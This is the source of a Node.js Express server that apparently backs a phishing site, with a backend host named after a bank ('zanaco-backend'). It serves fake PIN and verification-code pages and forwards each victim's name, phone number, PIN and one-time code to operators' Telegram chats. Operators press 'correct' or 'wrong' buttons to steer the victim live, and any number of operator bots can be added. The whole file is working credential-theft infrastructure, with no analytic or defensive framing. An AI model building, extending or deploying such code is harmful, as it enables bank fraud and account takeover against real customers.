require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// ---------------- MEMORY STORES ----------------
const approvedPins = {};      // requestId -> true/false/null
const approvedCodes = {};     // requestId -> true/false/null
const requestBotMap = {};     // requestId -> botId

// ---------------- MULTI-BOT STORE ----------------
const bots = [
    {
        botId: 'bot1',
        botToken: process.env.BOT1_TOKEN,
        chatId: process.env.BOT1_CHATID
    },
    {
        botId: 'bot2',
        botToken: process.env.BOT2_TOKEN,
        chatId: process.env.BOT2_CHATID
    }
];


// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
            {
                chat_id: bot.chatId,
                text,
                reply_markup: { inline_keyboard: inlineKeyboard }
            }
        );
        console.log(`✅ Telegram message sent by ${bot.botId}`);
    } catch (err) {
        console.error(`❌ Telegram send error [${bot.botId}]:`, err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
            { callback_query_id: callbackId }
        );
        console.log(`✅ Callback answered for ${bot.botId}: ${callbackId}`);
    } catch (err) {
        console.error(`❌ Telegram callback error [${bot.botId}]:`, err.response?.data || err.message);
    }
}

// ---------------- DYNAMIC PAGE SERVING ----------------
// Serve index.html or other pages with botId in URL
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).send('Invalid bot link');

    // Serve index.html first
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/details', (req, res) => res.sendFile(path.join(__dirname, 'public', 'details.html')));
app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
app.get('/success', (req, res) => res.sendFile(path.join(__dirname, 'public', 'success.html')));

// ---------------- PIN HANDLING ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(
        bot,
        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
        [[
            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    res.json({ approved: approvedPins[req.params.requestId] ?? null });
});

// ---------------- CODE HANDLING ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(
        bot,
        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
        [[
            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    if (action === 'pin_ok') approvedPins[requestId] = true;
    if (action === 'pin_bad') approvedPins[requestId] = false;
    if (action === 'code_ok') approvedCodes[requestId] = true;
    if (action === 'code_bad') approvedCodes[requestId] = false;

    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

// ---------------- ADD BOT ----------------
app.post('/add-bot', async (req, res) => {
    const { botId, botToken, chatId } = req.body;
    if (!botId || !botToken || !chatId) return res.status(400).json({ error: 'botId, botToken, chatId required' });

    if (getBot(botId)) return res.status(400).json({ error: 'Bot already exists' });

    bots.push({ botId, botToken, chatId });

    const webhookUrl = `https://zanaco-backend.onrender.com/telegram-webhook/${botId}`;
    try {
        const resp = await axios.get(`https://api.telegram.org/bot${botToken}/setWebhook?url=${webhookUrl}`);
        console.log(`✅ Webhook set for ${botId}:`, resp.data);
    } catch (err) {
        console.error('❌ Failed to set webhook:', err.response?.data || err.message);
        return res.status(500).json({ error: 'Failed to set webhook' });
    }

    res.json({
        ok: true,
        botLink: `https://zanaco-backend.onrender.com/bot/${botId}`
    });
});

// ---------------- START SERVER ----------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
